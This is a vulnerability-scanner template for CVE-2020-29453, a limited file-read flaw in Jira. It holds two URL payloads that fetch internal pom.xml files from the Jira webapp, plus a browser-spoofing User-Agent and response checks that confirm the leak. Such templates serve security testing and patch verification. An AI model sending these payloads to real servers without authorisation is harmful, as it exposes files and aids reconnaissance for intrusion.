id: CVE-2020-29453
info:
  name: Jira Limited LFI (CVE-2020-29453)
  risk: Medium
params:
  - root: "{{.BaseURL}}"
replicate:
  ports: '8080'
  prefixes: 'jira, wiki, confluence'
variables:
  - exp: |
      s/sample/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
      s/sample/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
requests:
  - method: GET
    redirect: false
    url: >-
      {{.root}}/{{.exp}}
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
    detections:
      - >-
        StatusCode() == 200 && StringSearch("resHeaders", "application/xml") && StringSearch("body", "modelVersion") && StringSearch("body", "<groupId>com.atlassian.jira</groupId>")
references:
  - link: https://jira.atlassian.com/browse/JRASERVER-72014
